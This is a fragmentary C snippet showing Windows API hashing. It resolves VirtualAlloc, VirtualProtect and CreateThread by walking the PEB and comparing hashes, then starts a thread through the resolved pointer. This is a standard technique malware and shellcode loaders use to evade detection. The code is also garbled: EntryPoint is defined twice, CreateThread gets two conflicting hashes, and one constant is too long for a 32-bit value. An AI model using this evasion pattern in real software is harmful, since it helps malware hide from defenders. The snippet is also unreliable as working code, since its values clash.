...
void WINAPI EntryPoint(void) {
    uint32_t h_VirtualAlloc = 0x44962A04;
    uint32_t h_VirtualProtect = 0xB73F60E5;
    uint32_t h_CreateThread = 0x1D527488;
    uint32_t h_WaitForSingleObject = 0x8CB3A417;
...
// Function pointer type for CreateThread
...
// Pre-calculated hash for "CreateThread"
uint32_t h_CreateThread = 0x00544e304; 
...
void* ResolveApi(uint32_t targetHash){
	// PEB Walk and call to the hashing function
	...
	if ((uint32_t)hash((unsigned char*)name, len) == targetHash) {
		return (void*)((BYTE*)entry->DllBase + funcs[ordinals[i]]);
	}
}

void WINAPI EntryPoint(void) {
    // Resolve the function address dynamically
    PfnCreateThread _CreateThread = (PfnCreateThread)ResolveApi(h_CreateThread);

    if (_CreateThread) {
        // Execute the resolved function
        HANDLE hThread = _CreateThread(NULL, 0, MyThreadFunction, NULL, 0, &dwThreadId);
    }
}